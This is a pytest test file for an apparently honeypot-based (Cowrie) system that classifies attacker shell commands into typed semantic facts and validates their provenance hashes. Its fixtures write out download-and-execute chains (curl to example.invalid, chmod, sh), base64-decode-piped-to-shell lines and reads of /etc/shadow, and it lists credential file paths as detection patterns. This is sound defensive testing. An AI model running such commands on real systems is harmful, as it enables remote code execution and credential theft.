from __future__ import annotations

import copy
import hashlib
import json
import time
import tracemalloc
from pathlib import Path

import pytest

import production.reporting.session_assessment_v4 as assessment_module
from production.policies.threat_hypothesis_behavior_policy import (
    policy_summary,
)
from production.policies.typed_semantic_vocabulary import (
    load_typed_semantic_vocabulary,
    validate_typed_semantic_vocabulary,
)
from production.reporting.session_assessment_v4 import (
    build_canonical_evidence_snapshot,
    build_session_assessment_v4,
    validate_session_assessment_v4,
)
from production.reporting.typed_semantic_facts import (
    TypedSemanticFactError,
    build_typed_semantic_fact_set,
    build_typed_semantic_provenance,
    build_typed_semantic_shadow_diff,
    render_typed_semantic_shadow_diff,
    run_typed_semantic_shadow,
    validate_typed_semantic_fact_set,
    validate_typed_semantic_shadow_diff,
    validate_typed_semantic_shadow_result,
)
from production.utils.serialization import stable_id, stable_json


ROOT = Path(__file__).resolve().parents[1]
BEHAVIOR_POLICY = "configs/threat_hypothesis_behavior.trusted.json"
CLASSIFICATION_POLICY = ROOT / "configs/classification_rules.trusted.json"
VOCABULARY_POLICY = ROOT / "configs/typed_semantic_vocabulary.v1.json"
EVALUATOR_REVISION = "a" * 40


def _payload(
    commands: list[str],
    *,
    session_id: str = "typed-semantic-shadow",
    event_overrides: list[dict] | None = None,
    classification_events: list[dict] | None = None,
    extra_events: list[dict] | None = None,
) -> dict:
    events = []
    successful = []
    failed = []
    for index, command in enumerate(commands):
        event = {
            "session": session_id,
            "src_ip": "192.0.2.120",
            "timestamp": f"2026-07-29T14:{index // 60:02d}:{index % 60:02d}Z",
            "eventid": "cowrie.command.input",
            "input": command,
            "success": 1,
        }
        if event_overrides:
            event.update(event_overrides[index])
        events.append(event)
        if event.get("success") in {0, False}:
            failed.append(command)
        elif event.get("success") in {1, True}:
            successful.append(command)
    events.extend(copy.deepcopy(extra_events or []))
    return {
        "session_id": session_id,
        "src_ip": "192.0.2.120",
        "commands": list(commands),
        "commands_success": successful,
        "commands_failed": failed,
        "classification_events": copy.deepcopy(
            classification_events or []
        ),
        "raw_events": events,
    }


def _inputs(
    payload: dict,
    *,
    vocabulary_path: str = "",
) -> tuple[dict, dict, dict]:
    snapshot, observed, _source, behavior_document = (
        build_canonical_evidence_snapshot(
            payload,
            payload["raw_events"],
            behavior_policy_path=BEHAVIOR_POLICY,
        )
    )
    provenance = build_typed_semantic_provenance(
        snapshot,
        observed_behavior=observed,
        behavior_policy_sha256=policy_summary(
            behavior_document,
            include_integrity=True,
        )["sha256"],
        classification_policy_sha256=hashlib.sha256(
            CLASSIFICATION_POLICY.read_bytes()
        ).hexdigest(),
        evaluator_git_revision=EVALUATOR_REVISION,
        vocabulary_path=vocabulary_path,
    )
    return snapshot, observed, provenance


def _build(
    payload: dict,
    *,
    vocabulary_path: str = "",
) -> dict:
    _snapshot, observed, provenance = _inputs(
        payload,
        vocabulary_path=vocabulary_path,
    )
    return build_typed_semantic_fact_set(
        observed,
        provenance=provenance,
        vocabulary_path=vocabulary_path,
    )


def _fact_for_command(fact_set: dict, command: str) -> dict:
    return next(
        fact
        for fact in fact_set["facts"]
        if fact["shell_context"]["command"] == command
    )


def _operation_types(fact_set: dict, command: str) -> list[str]:
    return [
        item["operation_type"]
        for item in _fact_for_command(fact_set, command)["operations"]
    ]


def _without_runtime_timestamp(report: dict) -> dict:
    result = copy.deepcopy(report)
    result.pop("generated_at", None)
    (result.get("response_guidance_v3") or {}).pop("generated_at", None)
    return result


def _rehash_single_entity_free_fact(value: dict) -> None:
    fact = value["facts"][0]
    for index, operation in enumerate(fact["operations"]):
        content = {
            key: item
            for key, item in operation.items()
            if key != "operation_id"
        }
        content["source_observation_ref"] = fact[
            "source_observation_ref"
        ]
        content["sequence_index"] = index
        operation["operation_id"] = stable_id(
            "typed_semantic_operation",
            content,
        )
    content = {
        key: item for key, item in fact.items() if key != "fact_id"
    }
    fact["fact_id"] = stable_id("typed_semantic_fact", content)
    digest_input = {
        key: item
        for key, item in value.items()
        if key != "fact_set_sha256"
    }
    value["fact_set_sha256"] = hashlib.sha256(
        stable_json(digest_input).encode("utf-8")
    ).hexdigest()


def test_vocabulary_is_closed_hash_bound_and_family_scoped() -> None:
    loaded = load_typed_semantic_vocabulary()

    assert loaded["status"] == "valid"
    assert loaded["source"] == "configs/typed_semantic_vocabulary.v1.json"
    assert loaded["sha256"] == hashlib.sha256(
        VOCABULARY_POLICY.read_bytes()
    ).hexdigest()
    assert loaded["document"]["authority"] == {
        "mode": "family_scoped_policy_input",
        "may_select_findings": True,
        "may_select_hypotheses": False,
        "may_select_guidance": True,
        "may_authorize_actions": False,
    }
    assert loaded["document"]["activation"]["family_states"][
        "sensitive_read"
    ] == "activated"
    assert loaded["document"]["activation"]["family_states"][
        "transfer"
    ] == "activated"
    assert loaded["document"]["activation"]["family_states"][
        "inspection"
    ] == "activated"
    assert all(
        state == "not_activated"
        for family, state in loaded["document"]["activation"][
            "family_states"
        ].items()
        if family not in {
            "unknown",
            "sensitive_read",
            "transfer",
            "inspection",
            "filesystem",
        }
    )
    assert set(loaded["document"]["entity_role_types"]) == set(
        loaded["document"]["vocabulary"]["entity_roles"]
    )
    assert loaded["document"]["sensitive_path_policy"] == {
        "schema_version": "typed_sensitive_path_policy.v1",
        "match_scope": "complete_parsed_path_operand",
        "exact_absolute_paths": ["/etc/passwd", "/etc/shadow"],
        "suffix_path_segments": [
            [".aws", "credentials"],
            [
                ".config",
                "gcloud",
                "application_default_credentials.json",
            ],
            [".ssh", "id_dsa"],
            [".ssh", "id_ecdsa"],
            [".ssh", "id_ed25519"],
            [".ssh", "id_rsa"],
        ],
    }
    assert validate_typed_semantic_vocabulary(
        loaded["document"]
    ) == []


@pytest.mark.parametrize(
    ("command", "expected"),
    [
        ("uptime", {"host_uptime_inspection"}),
        ("df -h /var", {"filesystem_capacity_inspection"}),
        ("uname -a", {"system_identity_inspection"}),
        ("id", {"account_identity_inspection"}),
        ("ip route show", {"network_route_inspection"}),
        ("ps aux", {"process_inspection"}),
        ("ss -tulpn", {"network_socket_inspection"}),
        ("getent passwd", {"account_database_inspection"}),
        ("find /tmp -type f", {"filesystem_search"}),
        ("cat /etc/passwd", {"file_read", "credential_path_read"}),
        ("sed -i s/a/b/ ./target", {"file_read", "file_modify"}),
        ("echo value > ./target", {"literal_data_emission", "file_write"}),
        ("echo value >> ./target", {"literal_data_emission", "file_append"}),
        ("base64 --decode /tmp/blob", {"decode_transform"}),
        (
            "tar -czf /tmp/logs.tgz /var/log",
            {"file_read", "archive_create"},
        ),
        ("crontab -l", {"schedule_inspect"}),
        ("crontab -r", {"schedule_delete"}),
        ("crontab /tmp/jobs", {"schedule_modify"}),
        ("systemctl status sshd", {"service_inspect"}),
        ("systemctl restart sshd", {"service_modify"}),
        ("rm -f /tmp/item", {"file_delete"}),
        ("chmod 700 /tmp/item", {"permission_modify"}),
    ],
)
def test_reviewed_complete_commands_use_general_semantic_families(
    command: str,
    expected: set[str],
) -> None:
    fact_set = _build(
        _payload(
            [command],
            session_id="reviewed-" + hashlib.sha256(
                command.encode("utf-8")
            ).hexdigest()[:12],
            event_overrides=[{"cwd": "/srv/cowrie"}],
        )
    )

    assert set(_operation_types(fact_set, command)) == expected
    assert "unknown" not in expected
    assert validate_typed_semantic_fact_set(fact_set) == []


@pytest.mark.parametrize("command", ["chmod 700", "rm"])
def test_incomplete_reviewed_commands_remain_unknown(command: str) -> None:
    fact_set = _build(_payload([command], session_id="incomplete"))
    fact = _fact_for_command(fact_set, command)

    assert _operation_types(fact_set, command) == ["unknown"]
    assert fact["abstention_reasons"] == ["missing_operand"]
    assert fact["operations"][0]["effect_status"] == "abstained"


def test_ordered_facets_preserve_critical_semantic_distinctions() -> None:
    commands = [
        "cat /tmp/data",
        "sed -i s/x/y/ /tmp/data",
        "uptime",
        "rm /tmp/data",
        "echo first > /tmp/out",
        "echo second >> /tmp/out",
        "base64 -d /tmp/encoded",
        "base64 -d /tmp/encoded > /tmp/decoded",
        "base64 -d /tmp/encoded | sh",
    ]
    fact_set = _build(
        _payload(commands, session_id="semantic-distinctions")
    )

    assert _operation_types(fact_set, commands[0]) == ["file_read"]
    assert _operation_types(fact_set, commands[1]) == [
        "file_read",
        "file_modify",
    ]
    assert _operation_types(fact_set, commands[2]) == [
        "host_uptime_inspection"
    ]
    assert _operation_types(fact_set, commands[3]) == ["file_delete"]
    assert _operation_types(fact_set, commands[4]) == [
        "literal_data_emission",
        "file_write",
    ]
    assert _operation_types(fact_set, commands[5]) == [
        "literal_data_emission",
        "file_append",
    ]
    assert _operation_types(fact_set, commands[6]) == ["decode_transform"]
    assert _operation_types(fact_set, commands[7]) == [
        "decode_transform",
        "file_write",
    ]
    assert _operation_types(fact_set, "base64 -d /tmp/encoded") == [
        "decode_transform"
    ]
    assert _operation_types(fact_set, "sh") == [
        "shell_pipe_execution_attempt"
    ]
    assert validate_typed_semantic_fact_set(fact_set) == []


def test_command_transfer_is_attempt_until_direct_transfer_event() -> None:
    command = "curl https://example.invalid/payload -o /tmp/payload"
    direct_event = {
        "session": "transfer-proof",
        "src_ip": "192.0.2.120",
        "timestamp": "2026-07-29T14:00:01Z",
        "eventid": "cowrie.session.file_download",
        "destfile": "/tmp/payload",
        "url": "https://example.invalid/payload",
        "shasum": "b" * 64,
    }
    fact_set = _build(
        _payload(
            [command],
            session_id="transfer-proof",
            extra_events=[direct_event],
        )
    )
    command_fact = _fact_for_command(fact_set, command)
    transfer_fact = next(
        fact
        for fact in fact_set["facts"]
        if fact["evidence_type"] == "direct_cowrie_transfer_event"
    )

    assert {item["operation_type"] for item in command_fact["operations"]} == {
        "remote_content_access",
        "transfer_attempt",
    }
    assert "transfer_observed" not in {
        item["operation_type"] for item in command_fact["operations"]
    }
    assert _operation_types(fact_set, "") == ["transfer_observed"]
    assert transfer_fact["outcome"]["status"] == "event_observed"
    assert any(
        item["relationship_type"] == "transfer_observation_confirmation"
        and item["status"] == "supported"
        for item in fact_set["relationships"]
    )


def test_outcomes_do_not_promote_failure_compound_or_unknown_effects() -> None:
    failed = _build(
        _payload(
            ["rm /tmp/failed"],
            session_id="failed-effect",
            event_overrides=[{"success": 0}],
        )
    )
    failed_fact = failed["facts"][0]
    assert failed_fact["outcome"]["status"] == "reported_failure"
    assert {
        item["effect_status"] for item in failed_fact["operations"]
    } == {"reported_failed"}

    unknown_event = {
        "session": "unknown-effect",
        "src_ip": "192.0.2.120",
        "timestamp": "2026-07-29T14:00:00Z",
        "eventid": "cowrie.command.input",
        "input": "chmod 700 /tmp/item",
    }
    unknown_payload = _payload(
        [],
        session_id="unknown-effect",
        extra_events=[unknown_event],
    )
    unknown_payload["commands"] = ["chmod 700 /tmp/item"]
    unknown = _build(unknown_payload)
    assert unknown["facts"][0]["outcome"]["status"] == "outcome_unknown"
    assert {
        item["effect_status"] for item in unknown["facts"][0]["operations"]
    } == {"attempted_unconfirmed"}

    compound = _build(
        _payload(
            ["base64 -d /tmp/item | sh"],
            session_id="compound-effect",
        )
    )
    assert all(
        operation["effect_status"] == "compound_unconfirmed"
        for fact in compound["facts"]
        for operation in fact["operations"]
    )
    assert validate_typed_semantic_fact_set(failed) == []
    assert validate_typed_semantic_fact_set(unknown) == []
    assert validate_typed_semantic_fact_set(compound) == []


def test_working_directory_and_path_identity_are_conservative() -> None:
    commands = [
        "cd /var/tmp",
        'cat "relative name"',
        "cat /etc/hosts",
    ]
    fact_set = _build(
        _payload(commands, session_id="cwd-paths")
    )
    relative = _fact_for_command(fact_set, 'cat "relative name"')
    absolute = _fact_for_command(fact_set, "cat /etc/hosts")

    assert relative["working_directory_context"]["status"] == "confirmed"
    assert relative["working_directory_context"]["effective"] == "/var/tmp"
    assert relative["entities"]["read_paths"][0]["original_value"] == (
        "relative name"
    )
    assert relative["entities"]["read_paths"][0]["normalized_value"] == (
        "/var/tmp/relative name"
    )
    assert relative["path_resolutions"][0]["resolution_status"] == (
        "recorded_resolved"
    )
    assert absolute["entities"]["read_paths"][0]["normalized_value"] == (
        "/etc/hosts"
    )

    failed = _build(
        _payload(
            ["cd /opt/failed", "cat local"],
            session_id="failed-cwd",
            event_overrides=[{"success": 0}, {"success": 1}],
        )
    )
    failed_cd = _fact_for_command(failed, "cd /opt/failed")
    following = _fact_for_command(failed, "cat local")
    assert failed_cd["working_directory_context"]["directory_change"][
        "status"
    ] == "failed"
    assert following["working_directory_context"]["status"] == "unknown"
    assert following["path_resolutions"][0]["resolution_status"] == (
        "unresolved"
    )
    assert following["path_resolutions"][0]["path_identity_id"] == ""
    assert following["path_resolutions"][0]["candidate_identity_id"] == ""


@pytest.mark.parametrize(
    ("command", "reason"),
    [
        ('cat "/tmp/open', "malformed_quoting"),
        ("echo $(id)", "unsupported_shell_syntax"),
        ("cat << EOF", "unsupported_shell_syntax"),
        ("rm --preserve-root /tmp/item", "unsupported_option"),
        ("ll /tmp", "unsupported_executable"),
        ("cat $TARGET", "expansion_unresolved"),
    ],
)
def test_malformed_unsupported_alias_and_expansion_forms_abstain(
    command: str,
    reason: str,
) -> None:
    fact_set = _build(_payload([command], session_id="unsupported-form"))
    fact = fact_set["facts"][0]

    assert [item["operation_type"] for item in fact["operations"]] == [
        "unknown"
    ]
    assert reason in fact["abstention_reasons"]
    assert validate_typed_semantic_fact_set(fact_set) == []


def test_relationships_rebuild_across_the_complete_session_and_resolve() -> None:
    commands = [
        "curl https://example.invalid/p -o /tmp/p",
        "uptime",
        "chmod 700 /tmp/p",
        "sh /tmp/p",
    ]
    fact_set = _build(
        _payload(commands, session_id="complete-session-relationships")
    )
    fact_ids = {item["fact_id"] for item in fact_set["facts"]}
    entity_ids = {item["entity_id"] for item in fact_set["entities"]}
    operation_ids = {
        operation["operation_id"]
        for fact in fact_set["facts"]
        for operation in fact["operations"]
    }
    relationship_ids = {
        item["relationship_id"] for item in fact_set["relationships"]
    }

    assert len(fact_set["relationships"]) >= 3
    assert all(
        relationship["source_fact_id"] in fact_ids
        and relationship["target_fact_id"] in fact_ids
        and (
            not relationship["entity_ref"]
            or relationship["entity_ref"] in entity_ids
        )
        and set(relationship["source_operation_ids"]) <= operation_ids
        and set(relationship["target_operation_ids"]) <= operation_ids
        for relationship in fact_set["relationships"]
    )
    assert all(
        set(chain["fact_refs"]) <= fact_ids
        and set(chain["relationship_refs"]) <= relationship_ids
        and set(chain["entity_refs"]) <= entity_ids
        and set(chain["operation_refs"]) <= operation_ids
        for chain in fact_set["chains"]
    )

    conditional = _build(
        _payload(
            [
                (
                    "cd /var/tmp && curl "
                    "https://example.invalid/a -o artifact"
                ),
                "sh /var/tmp/artifact",
            ],
            session_id="conditional-relationship",
        )
    )
    candidate_links = [
        item
        for item in conditional["relationships"]
        if item["proof_scope"] == "shared_conditional_identity"
    ]
    assert candidate_links
    assert all(
        item["status"] == "partial"
        and item["entity_ref"] == ""
        and "identity_unresolved" in item["abstention_reasons"]
        for item in candidate_links
    )
    assert validate_typed_semantic_fact_set(fact_set) == []
    assert validate_typed_semantic_fact_set(conditional) == []


def test_attck_candidates_have_explicit_scope_and_never_define_operations() -> None:
    command = "frobnicate --quiet target"
    timestamp = "2026-07-29T14:00:00Z"
    classification = [{
        "command": command,
        "original_command": command,
        "ttp": "T1059",
        "tactic": "execution",
        "source": "rule",
        "high_confidence": True,
        "evidence_id": "typed-classification",
        "event_timestamp": timestamp,
        "cowrie_eventid": "cowrie.command.input",
        "agreement_status": "rule_only",
    }]
    fact_set = _build(
        _payload(
            [command],
            session_id="attck-scope",
            classification_events=classification,
        )
    )
    fact = fact_set["facts"][0]
    candidate = fact_set["attck_candidates"][0]

    assert _operation_types(fact_set, command) == ["unknown"]
    assert candidate["mapping_scope"] == "fragment_exact"
    assert candidate["proof_scope"] == "classification_candidate"
    assert candidate["may_define_operations"] is False
    assert candidate["fact_refs"] == [fact["fact_id"]]
    assert fact["attck_candidate_refs"] == [candidate["candidate_id"]]
    assert validate_typed_semantic_fact_set(fact_set) == []


def test_provenance_binds_canonical_evidence_policies_input_and_revision() -> None:
    payload = _payload(["whoami"], session_id="provenance")
    snapshot, observed, provenance = _inputs(payload)
    fact_set = build_typed_semantic_fact_set(
        observed,
        provenance=provenance,
    )

    assert fact_set["provenance"]["canonical_evidence_sha256"] == (
        snapshot["evidence_sha256"]
    )
    assert fact_set["provenance"]["source_evidence_sha256"] == (
        snapshot["source_evidence_sha256"]
    )
    assert fact_set["provenance"]["behavior_policy_sha256"]
    assert fact_set["provenance"]["classification_policy_sha256"] == (
        hashlib.sha256(CLASSIFICATION_POLICY.read_bytes()).hexdigest()
    )
    assert fact_set["provenance"]["evaluator_git_revision"] == (
        EVALUATOR_REVISION
    )
    assert fact_set["provenance"]["semantic_vocabulary"]["sha256"] == (
        hashlib.sha256(VOCABULARY_POLICY.read_bytes()).hexdigest()
    )

    changed = copy.deepcopy(observed)
    changed["ordered_command_observations"][0]["command"] = "id"
    with pytest.raises(
        TypedSemanticFactError,
        match="does not match bound provenance",
    ):
        build_typed_semantic_fact_set(changed, provenance=provenance)

    tampered_snapshot = copy.deepcopy(snapshot)
    tampered_snapshot["session_id"] = "other"
    with pytest.raises(
        TypedSemanticFactError,
        match="canonical evidence SHA-256",
    ):
        build_typed_semantic_provenance(
            tampered_snapshot,
            observed_behavior=observed,
            behavior_policy_sha256="b" * 64,
            classification_policy_sha256="c" * 64,
            evaluator_git_revision=EVALUATOR_REVISION,
        )


def test_recomputed_hashes_cannot_legitimize_invented_semantic_values() -> None:
    fact_set = _build(_payload(["uptime"], session_id="forged-values"))
    forged = copy.deepcopy(fact_set)
    operation = forged["facts"][0]["operations"][0]
    operation.update({
        "operation_type": "invented_operation",
        "family": "invented_family",
        "effect": "invented_effect",
        "proof_scope": "classification_candidate",
        "effect_status": "invented_status",
        "source_literal_action": "invented_literal",
    })
    forged["facts"][0]["outcome"]["status"] = "invented_outcome"
    _rehash_single_entity_free_fact(forged)

    errors = validate_typed_semantic_fact_set(forged)

    assert "fact_set_sha256 mismatch" not in errors
    assert any("operation_type is invalid" in item for item in errors)
    assert any("outcome.status is invalid" in item for item in errors)


def test_vocabulary_rejects_invented_values_and_incomplete_coverage() -> None:
    document = json.loads(VOCABULARY_POLICY.read_text(encoding="utf-8"))
    forged = copy.deepcopy(document)
    forged["operations"]["made_up"] = {
        "family": "not_a_family",
        "effect": "not_an_effect",
    }
    forged["entity_role_types"].pop("read_paths")
    forged["activation"]["family_states"]["execution"] = "activated"
    forged["sensitive_path_policy"]["suffix_path_segments"].append(
        ["..", "invented"]
    )

    errors = validate_typed_semantic_vocabulary(forged)

    assert any("outside the vocabulary" in item for item in errors)
    assert any("cover every entity role exactly" in item for item in errors)
    assert any("must be not_activated" in item for item in errors)
    assert any("invalid path segment" in item for item in errors)


def test_shadow_fact_and_diff_are_deterministic_and_strictly_valid() -> None:
    payload = _payload(
        [
            "curl https://example.invalid/tool -o /tmp/tool",
            "chmod 700 /tmp/tool",
            "sh /tmp/tool",
        ],
        session_id="deterministic-shadow",
    )
    _snapshot, observed, provenance = _inputs(payload)
    original = copy.deepcopy(observed)

    first = build_typed_semantic_fact_set(
        observed,
        provenance=provenance,
    )
    second = build_typed_semantic_fact_set(
        observed,
        provenance=provenance,
    )
    first_diff = build_typed_semantic_shadow_diff(observed, first)
    second_diff = build_typed_semantic_shadow_diff(observed, second)

    assert first == second
    assert first_diff == second_diff
    assert render_typed_semantic_shadow_diff(first_diff) == (
        render_typed_semantic_shadow_diff(second_diff)
    )
    assert validate_typed_semantic_fact_set(first) == []
    assert validate_typed_semantic_shadow_diff(first_diff) == []
    assert observed == original
    assert first["authority"]["may_select_hypotheses"] is False
    assert first["authority"]["may_select_guidance"] is True
    assert first_diff["policy_impact"]["authoritative_change"] == (
        "sensitive_read_and_direct_transfer_observation"
    )


def test_bounded_parser_matrix_fails_safely() -> None:
    supported = [
        "cat /tmp/value",
        " cat   /tmp/value ",
        'cat "/tmp/value"',
        "curl -s -S -L https://example.invalid/x -o /tmp/x",
        "curl -L -S -s https://example.invalid/x -o /tmp/x",
        "echo value>/tmp/x",
        "echo value >> /tmp/x",
        "base64 --decode < /tmp/x > /tmp/y",
    ]
    for index, command in enumerate(supported):
        fact_set = _build(
            _payload([command], session_id=f"bounded-supported-{index}")
        )
        assert validate_typed_semantic_fact_set(fact_set) == []
        assert fact_set["facts"][0]["operations"][0][
            "operation_type"
        ] != "unknown"

    unsupported = [
        'cat "/tmp/value',
        "cat $(printf /tmp/value)",
        "cat <(printf value)",
        "cat << EOF",
        "rm --preserve-root /tmp/x",
        "base64 --decode --wrap=3 /tmp/x",
        "echo ${VALUE}",
    ]
    for index, command in enumerate(unsupported):
        fact_set = _build(
            _payload([command], session_id=f"bounded-unsupported-{index}")
        )
        assert _operation_types(fact_set, command.strip()) == ["unknown"]
        assert fact_set["facts"][0]["abstention_reasons"]
        assert validate_typed_semantic_fact_set(fact_set) == []


def test_limits_and_empty_incomplete_session_fail_safely(
    tmp_path: Path,
) -> None:
    document = json.loads(VOCABULARY_POLICY.read_text(encoding="utf-8"))
    document["limits"]["max_facts"] = 2
    limited = tmp_path / "typed-vocabulary.json"
    limited.write_text(
        json.dumps(document, sort_keys=True),
        encoding="utf-8",
    )
    payload = _payload(
        ["uptime", "whoami", "hostname"],
        session_id="over-limit",
    )
    _snapshot, observed, provenance = _inputs(
        payload,
        vocabulary_path=str(limited),
    )
    with pytest.raises(TypedSemanticFactError, match="fact limit"):
        build_typed_semantic_fact_set(
            observed,
            provenance=provenance,
            vocabulary_path=str(limited),
        )

    empty = _build(_payload([], session_id="empty-session"))
    assert empty["facts"] == []
    assert empty["relationships"] == []
    assert empty["chains"] == []
    assert empty["shadow_comparison"]["status"] == (
        "exact_source_coverage"
    )
    assert validate_typed_semantic_fact_set(empty) == []


def test_bounded_large_session_performance_and_memory() -> None:
    commands = [f"cat /tmp/object-{index}" for index in range(128)]
    payload = _payload(commands, session_id="bounded-performance")
    _snapshot, observed, provenance = _inputs(payload)

    tracemalloc.start()
    started = time.perf_counter()
    fact_set = build_typed_semantic_fact_set(
        observed,
        provenance=provenance,
    )
    elapsed = time.perf_counter() - started
    _current, peak = tracemalloc.get_traced_memory()
    tracemalloc.stop()

    assert fact_set["limits"]["fact_count"] == 128
    assert fact_set["limits"]["entity_count"] == 128
    assert fact_set["limits"]["relationship_count"] == 0
    assert elapsed < 10.0
    assert peak < 64 * 1024 * 1024
    assert validate_typed_semantic_fact_set(fact_set) == []


def test_family_input_failure_suppresses_only_activated_sensitive_outputs(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    payload = _payload(
        ["cat /etc/shadow"],
        session_id="shadow-output-isolation",
    )
    baseline = build_session_assessment_v4(
        [payload],
        raw_events=payload["raw_events"],
        behavior_policy_path=BEHAVIOR_POLICY,
        classification_policy_path=str(CLASSIFICATION_POLICY),
    )
    def unavailable_facts(_: dict, **_kwargs: object) -> dict:
        raise RuntimeError("controlled family-input failure")

    monkeypatch.setattr(
        assessment_module,
        "build_typed_semantic_fact_set",
        unavailable_facts,
    )
    unavailable = build_session_assessment_v4(
        [payload],
        raw_events=payload["raw_events"],
        behavior_policy_path=BEHAVIOR_POLICY,
        classification_policy_path=str(CLASSIFICATION_POLICY),
    )

    assert "observed_credential_path_read_command" in {
        item["finding_type"]
        for item in baseline["behavioral_findings"]
    }
    assert "observed_credential_path_read_command" not in {
        item["finding_type"]
        for item in unavailable["behavioral_findings"]
    }
    assert "review-credential-exposure-and-reuse" in {
        item["action_id"]
        for item in baseline["response_guidance_v3"]["advisory_actions"]
    }
    assert "review-credential-exposure-and-reuse" not in {
        item["action_id"]
        for item in unavailable["response_guidance_v3"][
            "advisory_actions"
        ]
    }
    assert unavailable["provenance"]["typed_semantics"]["status"] == (
        "unavailable"
    )
    assert unavailable["response_guidance_v3"]["provenance"][
        "typed_semantics"
    ]["status"] == "unavailable"
    assert validate_session_assessment_v4(baseline) == []
    assert validate_session_assessment_v4(unavailable) == []


def test_shadow_runtime_result_is_small_valid_and_contains_no_facts() -> None:
    payload = _payload(
        ["mystery-tool --inspect"],
        session_id="shadow-runtime-result",
    )
    snapshot, observed, provenance = _inputs(payload)
    result = run_typed_semantic_shadow(
        observed,
        canonical_evidence=snapshot,
        behavior_policy_sha256=provenance["behavior_policy_sha256"],
        classification_policy_sha256=provenance[
            "classification_policy_sha256"
        ],
        evaluator_git_revision=provenance["evaluator_git_revision"],
    )

    assert result["status"] == "valid"
    assert result["authoritative"] is False
    assert result["persistence"] == "discarded"
    assert result["comparison"]["unknown_operation_count"] == 1
    assert "facts" not in result
    assert validate_typed_semantic_shadow_result(result) == []
